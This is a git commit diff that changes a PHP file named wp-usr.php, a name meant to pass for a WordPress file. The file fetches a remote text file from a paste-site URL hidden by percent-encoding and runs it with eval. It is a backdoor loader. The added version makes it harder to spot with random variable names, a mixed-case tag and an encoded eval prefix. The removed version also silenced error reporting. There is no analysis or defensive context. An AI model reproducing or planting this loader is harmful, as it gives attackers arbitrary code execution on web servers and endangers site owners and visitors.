ac097fa66bd6dab7cacbbd70a1f5a212bc944545
unamexid <155900225+unamexid@users.noreply.github.com>
2024-06-12 12:50:45 +0630

    Add files via upload

--- x/wp-usr.php
+++ x/wp-usr.php
@@ -1,22 +1,9 @@
-<?php
+<?pHp
 
-@set_time_limit(0);
-@ini_set('html_errors', '0');
 @clearstatcache();
-$d_17b31f50 = false;
-if ($d_17b31f50) {
-    error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
-    @ini_set('display_errors', '1');
-    @ini_set('log_errors', '1');
-} else {
-    error_reporting(0);
-    @ini_set('display_errors', '0');
-    @ini_set('log_errors', '0');
-}
-
-$handle = fopen(urldecode('%68%74%74%70%73%3a%2f%2f%70%61%73%74%65%2e%6d%79%63%6f%6e%61%6e%2e%6e%65%74%2f%34%39%36%39%35%32%2e%74%78%74'), 'r');
-$content = stream_get_contents($handle);
-fclose($handle);
-eval('?>'.$content);
+$XNlsK47az0 = fopen(urldecode('%68%74%74%70%73%3a%2f%2f%70%61%73%74%65%2e%6d%79%63%6f%6e%61%6e%2e%6e%65%74%2f%34%39%37%33%34%37%2e%74%78%74'), 'r');
+$DdJHaBoYl6 = stream_get_contents($XNlsK47az0);
+fclose($XNlsK47az0);
+eval(urldecode('%3f%3e').$DdJHaBoYl6);
 
 ?>
